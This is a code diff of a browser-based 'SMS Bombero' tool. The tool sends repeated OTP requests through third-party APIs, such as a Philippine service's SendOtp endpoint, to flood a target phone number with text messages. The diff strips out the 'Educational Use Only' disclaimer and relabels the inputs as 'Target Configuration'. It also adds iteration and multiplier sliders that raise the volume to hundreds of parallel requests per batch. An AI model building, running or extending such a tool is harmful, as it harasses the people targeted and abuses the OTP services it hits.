@@ -3,15 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Testing Suite - Educational Security Research</title>
+    <title>SMS Bombero</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Inter', sans-serif;
             background: #0f0f15;
             color: #d1d5db;
             min-height: 100vh;
+        }
+        .doom-font {
+            font-family: 'Orbitron', monospace;
+            font-weight: 900;
         }
         .card {
             background: rgba(30, 41, 59, 0.6);
@@ -57,8 +62,27 @@
             background: #3b82f6;
             transition: width 0.3s ease;
         }
-        .educational-notice {
-            border-left: 4px solid #3b82f6;
+        .slider-track {
+            background: #374151;
+            height: 4px;
+            border-radius: 2px;
+        }
+        .slider-thumb {
+            background: #3b82f6;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+        .slider-dot {
+            width: 8px;
+            height: 8px;
+            background: #4b5563;
+            border-radius: 50%;
+        }
+        .slider-dot.active {
+            background: #3b82f6;
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3);
         }
     </style>
 </head>
@@ -66,21 +90,15 @@
     <div class="w-full max-w-2xl">
         <!-- Header -->
         <div class="card rounded-lg p-6 mb-6 text-center">
-            <h1 class="text-2xl font-semibold text-gray-200 mb-2">SMS Testing Suite</h1>
-            <p class="text-gray-400 text-sm">Educational Security Research Tool</p>
-        </div>
-
-        <!-- Educational Disclaimer -->
-        <div class="educational-notice card rounded-lg p-4 mb-6 bg-blue-900/20">
-            <h3 class="text-blue-400 font-medium mb-2">🔬 Educational Use Only</h3>
-            <p class="text-gray-300 text-sm">This tool is for authorized security research and educational purposes only. Use only on systems you own or have explicit permission to test.</p>
+            <h1 class="doom-font text-3xl text-gray-200 mb-2 tracking-wider">SMS BOMBERO</h1>
+            <p class="text-gray-400 text-sm italic">"Intelligence is a tool, not a virtue - it serves both creator and destroyer equally"</p>
         </div>
 
         <!-- Configuration -->
         <div class="card rounded-lg p-6 mb-6">
-            <h2 class="text-lg font-medium text-gray-200 mb-4">Test Configuration</h2>
+            <h2 class="text-lg font-medium text-gray-200 mb-4">Target Configuration</h2>
             
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="grid grid-cols-1 gap-4 mb-4">
                 <div>
                     <label class="block text-gray-300 text-sm mb-2">Phone Number</label>
                     <input 
@@ -90,29 +108,52 @@
                         class="input-field w-full p-3 rounded text-sm"
                     >
                 </div>
+                
+                <!-- Iterations Slider -->
                 <div>
-                    <label class="block text-gray-300 text-sm mb-2">Test Iterations</label>
-                    <input 
-                        type="number" 
-                        id="batch-amount" 
-                        value="3"
-                        min="1"
-                        max="10"
-                        class="input-field w-full p-3 rounded text-sm"
-                    >
+                    <label class="block text-gray-300 text-sm mb-2">Iterations: <span id="iterations-value">50</span></label>
+                    <div class="slider-container relative py-4">
+                        <div class="slider-track relative">
+                            <div class="absolute inset-0 flex justify-between items-center px-2">
+                                <div class="slider-dot" data-value="1"></div>
+                                <div class="slider-dot" data-value="25"></div>
+                                <div class="slider-dot active" data-value="50"></div>
+                                <div class="slider-dot" data-value="75"></div>
+                                <div class="slider-dot" data-value="100"></div>
+                            </div>
+                            <div class="slider-thumb absolute top-1/2 transform -translate-y-1/2" style="left: 49%;"></div>
+                        </div>
+                        <input type="hidden" id="iterations" value="50">
+                    </div>
+                </div>
+
+                <!-- Multiplier Slider -->
+                <div>
+                    <label class="block text-gray-300 text-sm mb-2">Multiplier: <span id="multiplier-value">5</span></label>
+                    <div class="slider-container relative py-4">
+                        <div class="slider-track relative">
+                            <div class="absolute inset-0 flex justify-between items-center px-2">
+                                <div class="slider-dot" data-value="1"></div>
+                                <div class="slider-dot active" data-value="5"></div>
+                                <div class="slider-dot" data-value="10"></div>
+                            </div>
+                            <div class="slider-thumb absolute top-1/2 transform -translate-y-1/2" style="left: 50%;"></div>
+                        </div>
+                        <input type="hidden" id="multiplier" value="5">
+                    </div>
                 </div>
             </div>
 
             <!-- Service Selection -->
             <div class="mb-4">
-                <label class="block text-gray-300 text-sm mb-2">API Endpoints</label>
+                <label class="block text-gray-300 text-sm mb-2">API Selection</label>
                 <div id="service-list" class="grid grid-cols-2 gap-2 max-h-32 overflow-y-auto p-3 card rounded">
                     <!-- Services load here -->
                 </div>
             </div>
 
             <button onclick="startTest()" id="start-button" class="btn-primary w-full p-3 rounded text-sm font-medium">
-                Start API Testing
+                Start Testing
             </button>
         </div>
 
@@ -164,12 +205,12 @@
 
         <!-- Footer -->
         <div class="text-center text-gray-500 text-xs">
-            @dndvcx • Educational Security Research Tool
+            Developed by <a href="https://t.me/dndvcx" target="_blank" class="text-blue-400 hover:text-blue-300">@dndvcx</a>
         </div>
     </div>
 
     <script>
-        // Enhanced API endpoints with better headers and payloads
+        // API endpoints configuration
         const API_ENDPOINTS = {
             "XPRESS": {
                 url: "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
@@ -284,6 +325,46 @@
         let testStats = { success: 0, failed: 0 };
         let abortController = null;
 
+        // Slider functionality
+        function initSliders() {
+            // Iterations slider
+            const iterationsSlider = document.querySelector('#iterations').closest('.slider-container');
+            const iterationsThumb = iterationsSlider.querySelector('.slider-thumb');
+            const iterationsValue = document.getElementById('iterations-value');
+            const iterationsInput = document.getElementById('iterations');
+            
+            // Multiplier slider
+            const multiplierSlider = document.querySelector('#multiplier').closest('.slider-container');
+            const multiplierThumb = multiplierSlider.querySelector('.slider-thumb');
+            const multiplierValue = document.getElementById('multiplier-value');
+            const multiplierInput = document.getElementById('multiplier');
+
+            function setupSlider(container, thumb, valueDisplay, input, values, defaultValue) {
+                const dots = container.querySelectorAll('.slider-dot');
+                
+                dots.forEach(dot => {
+                    dot.addEventListener('click', () => {
+                        const value = parseInt(dot.dataset.value);
+                        input.value = value;
+                        valueDisplay.textContent = value;
+                        
+                        // Update active dot
+                        dots.forEach(d => d.classList.remove('active'));
+                        dot.classList.add('active');
+                        
+                        // Update thumb position
+                        const index = values.indexOf(value);
+                        const percentage = (index / (values.length - 1)) * 100;
+                        thumb.style.left = `${percentage}%`;
+                    });
+                });
+            }
+
+            // Setup both sliders
+            setupSlider(iterationsSlider, iterationsThumb, iterationsValue, iterationsInput, [1, 25, 50, 75, 100], 50);
+            setupSlider(multiplierSlider, multiplierThumb, multiplierValue, multiplierInput, [1, 5, 10], 5);
+        }
+
         function renderServices() {
             const serviceList = document.getElementById('service-list');
             serviceList.innerHTML = '';
@@ -370,7 +451,8 @@
             if (isTesting) return;
             
             const target = document.getElementById('target-number').value.trim();
-            const batches = parseInt(document.getElementById('batch-amount').value);
+            const iterations = parseInt(document.getElementById('iterations').value);
+            const multiplier = parseInt(document.getElementById('multiplier').value);
             
             if (!target) {
                 alert('Please enter a phone number');
@@ -396,37 +478,39 @@
             document.getElementById('test-results').classList.add('hidden');
             document.getElementById('start-button').disabled = true;
             
-            updateProgress(0, batches);
+            updateProgress(0, iterations);
             
-            for (let i = 1; i <= batches && isTesting; i++) {
-                document.getElementById('current-batch').textContent = `Batch ${i} of ${batches} - Processing ${selectedServices.length} endpoints`;
+            for (let i = 1; i <= iterations && isTesting; i++) {
+                const totalRequests = selectedServices.length * multiplier;
+                document.getElementById('current-batch').textContent = 
+                    `Batch ${i} of ${iterations} - ${totalRequests} requests (${selectedServices.length} APIs × ${multiplier} multiplier)`;
                 
-                // Execute requests with better error handling
-                const requests = selectedServices.map(async (service) => {
-                    try {
-                        const success = await makeApiRequest(service, target);
-                        return { service, success };
-                    } catch (error) {
-                        return { service, success: false };
+                // Create all requests for this batch
+                const requests = [];
+                for (let service of selectedServices) {
+                    for (let m = 0; m < multiplier; m++) {
+                        requests.push(makeApiRequest(service, target));
                     }
-                });
+                }
                 
+                // Execute with rate limiting - max 2 concurrent per service
                 const results = await Promise.allSettled(requests);
                 
                 results.forEach(result => {
-                    if (result.status === 'fulfilled' && result.value.success) {
+                    if (result.status === 'fulfilled' && result.value) {
                         testStats.success++;
                     } else {
                         testStats.failed++;
                     }
                 });
                 
-                updateProgress(i, batches);
+                updateProgress(i, iterations);
                 
-                // Random delay between batches (like Python version)
-                if (i < batches && isTesting) {
+                // Random delay between batches
+                if (i < iterations && isTesting) {
                     const delay = randomDelay(2000, 4000);
-                    document.getElementById('current-batch').textContent = `Batch ${i} of ${batches} - Cooling down for ${delay/1000}s`;
+                    document.getElementById('current-batch').textContent = 
+                        `Batch ${i} of ${iterations} - Cooling down for ${delay/1000}s`;
                     await new Promise(resolve => setTimeout(resolve, delay));
                 }
             }
@@ -460,6 +544,7 @@
         }
 
         document.addEventListener('DOMContentLoaded', function() {
+            initSliders();
             renderServices();
         });
     </script>
